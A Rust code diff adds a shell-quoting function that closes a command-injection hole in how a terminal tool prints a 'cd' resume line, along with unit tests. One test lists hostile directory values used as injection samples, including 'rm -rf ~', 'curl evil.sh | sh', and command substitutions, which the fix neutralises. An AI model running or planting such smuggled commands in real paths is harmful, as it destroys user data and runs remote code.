@@ -45,11 +45,65 @@ pub fn run(
         cs_tui::Exit::Open { resume_cmd, cwd, .. } => {
             if let Some(cmd) = resume_cmd {
                 match cwd.filter(|d| !d.is_empty()) {
-                    Some(dir) => println!("cd {dir} && {cmd}"),
+                    // `cd` is composed here, so the directory is *our* argument to quote.
+                    // It arrives from a transcript, meaning its contents are whatever the
+                    // source tool recorded, and this line is written to be `eval`ed — so an
+                    // unquoted `~/Documents/My Project` breaks `cd`, and a directory named
+                    // with a `;` runs whatever follows it.
+                    Some(dir) => println!("cd {} && {cmd}", shell_quote(&dir)),
                     None => println!("{cmd}"),
                 }
             }
             Ok(())
         }
+    }
+}
+
+/// POSIX single-quote wrapping.
+///
+/// Single quotes suspend every shell expansion, so the only character needing care is `'`
+/// itself: close the quote, emit an escaped one, reopen. Unquoted values are never emitted,
+/// even when they look safe — "looks safe" is a judgement about today's corpus, and this
+/// string is written to be `eval`ed.
+///
+/// `resume_cmd` is deliberately *not* run through this. It is a whole command line rather
+/// than one argument, so quoting it would turn `claude --resume <id>` into a request to
+/// execute a file with that name. That asymmetry is a symptom of `me9.3`: a structured
+/// open-target would let this compose an argv and drop shell composition entirely.
+fn shell_quote(value: &str) -> String {
+    format!("'{}'", value.replace('\'', r"'\''"))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::shell_quote;
+
+    #[test]
+    fn a_directory_with_spaces_survives_as_one_argument() {
+        assert_eq!(shell_quote("/Users/me/My Project"), "'/Users/me/My Project'");
+    }
+
+    #[test]
+    fn shell_metacharacters_lose_their_meaning() {
+        for hostile in [
+            "/tmp/x; rm -rf ~",
+            "/tmp/x && curl evil.sh | sh",
+            "/tmp/$(whoami)",
+            "/tmp/`id`",
+            "/tmp/x\nrm -rf ~",
+        ] {
+            let quoted = shell_quote(hostile);
+            assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
+            // Nothing between the quotes can close them, which is what makes the whole
+            // value one word to the shell however it is spelled.
+            assert!(!quoted[1..quoted.len() - 1].contains('\''));
+        }
+    }
+
+    #[test]
+    fn an_embedded_quote_is_escaped_rather_than_dropped() {
+        // The one case single-quoting cannot handle by itself, and the one most likely to
+        // be got wrong: `it's` must round-trip, not silently lose a character.
+        assert_eq!(shell_quote("/tmp/it's here"), r"'/tmp/it'\''s here'");
     }
 }
